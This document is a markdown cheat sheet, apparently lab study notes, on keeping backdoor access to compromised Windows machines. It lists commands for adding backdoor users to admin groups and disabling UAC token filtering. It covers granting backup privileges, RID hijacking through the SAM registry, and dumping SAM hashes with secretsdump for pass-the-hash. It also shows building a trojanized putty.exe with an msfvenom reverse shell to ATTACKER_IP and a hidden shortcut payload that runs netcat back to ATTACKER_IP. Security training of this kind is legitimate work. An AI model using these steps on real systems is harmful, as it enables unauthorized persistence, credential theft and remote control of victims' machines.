# Tools Used

 - Evil-WinRM
 - PsExec64.exe
 - secretsdump.py

# Remote connection to Windows machine

| Desctipyion                                                | Command                                                   |
| :---                                                       | :---                                                      |
| Establishing remote connection to windows machine          | `evil-winrm -i >MACHINE_IP> -u <USER> -p <PASSWORD>`      | 

# Establishing Backdoor Users by changing their permission

## By adding users to groups
| Desctipyion                                                | Command                                                   |
| :---                                                       | :---                                                      |
| Adding user to `administrators` group                      | `net localgroup administrators <USER> /add`               |
| Adding user to `remote management user` group              | `net localgroup "Remote Management Users" <USER> /add`    | 


Sometimes adding yourself to the `remote` group will not allow you to access the machine straight away as the group might be disabled. This can be verified using the `whoami /group` command. This is due to the User Access Control (UAC). To make this work you will have to disable `LocalAccountTokenFilterPolicy`.

 ``reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1``

## By giving users Special Privileges and Security Descriptors
Special groups are only special because the operating system assigns them specific privileges by default. We can add users to these special groups by using `secedit`.

| Desctipyion                                                | Command                                                   |
| :---                                                       | :---                                                      |
| Export the current configurations                          | `secedit /export /cfg config.inf`                         |
| Open the file and add the user to `SeBackupPrivilege`      | `SeBackupPrivilege = <USER1>, <MALICIOUS_USER>`           |
| Open the file and add the user to `SeRestorePrivilege`     | `SeRestorePrivilege = <USER1>, <MALICIOUS_USER>`          |
| Convert the `.inf` file into a `.sdb` file                 | `secedit /import /cfg config.inf /db config.sdb`          | 
| Load the configuration back into the system                | `secedit /configure /db config.sdb /cfg config.inf`       |

If the following does not work we can change the security descriptor to allow `<MALICIOUS_USER>` to connect. You can use Powershell to open the configuration:

 - ``Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI``
 - Add the `<MALICOUS_USER>`
 - Give `Full Control` Access

## RID Hijacking
This method is used by changing some registry values and tricking the system to think you are the Administrator. In any system default Administrator account is assigned `RID = 500` and all other users `RID >= 1000`.

RID can be spot easily as they are the last bit of the SID. For example:
 - SID: S-1-5-21-1966530601-3185510712-10604624-500
 - RID: 500

| Desctipyion                                | Command                                                  |
| :---                                       | :---                                                     |
| Find assigned RID of a user                | `wmic useraccount get name,sid`                          | 
| Use PsExec to access SAM using Regedit     | `PsExec64.exe -i -s regedit`                             | 
| Go to                                      | `HKLM\SAM\SAM\Domains\Account\Users\`                    |

Once Regedit is opened you will need to find the key of the user who will be getting the admin privilege. The keys are in Hex value wo you will need to use a Hex calculator to change the last digits of the SID to hex. Once the folder is found open the `F` binary file, which holds the user's effective RID at position 0x30. The RID is stored using little-endian hence the bytes are reversed. Hence replace the byrtes accordingly which is `F4 01`.  

## Collect SAM and System files

| Desctipyion                            | Command                                                                                 |
| :---                                   | :---                                                                                    |
| Save `system.bak` files                | `reg save hklm\system system.bak`                                                       |
| Save `sam.bak` files                   | `reg save hklm\sam sam.bak`                                                             |
| Download files                         | `download system.bak` and `download sam.bak`                                            |
| Dump password hashes for all users     | `python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCALi`|
| Perform `Pass-the-Hash`                | `evil-winrm -i <MACHINE_IP> -u <USER> -H <HASH>`                                        |


# Creating Backdoors through common used files

## Creating executable files
You can plant a payload to the users machine and create an executable file using `msvenom` to create a backdoor putty.

``msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe``

## Shortcut files
We can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

Create a powershell payload:

``Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe``

Add the following path to a malicious shortcut file. `-windowstyle hidden` ensures that the script is run in the background:
``powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1`` 

## Hijacking File Associations
In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.



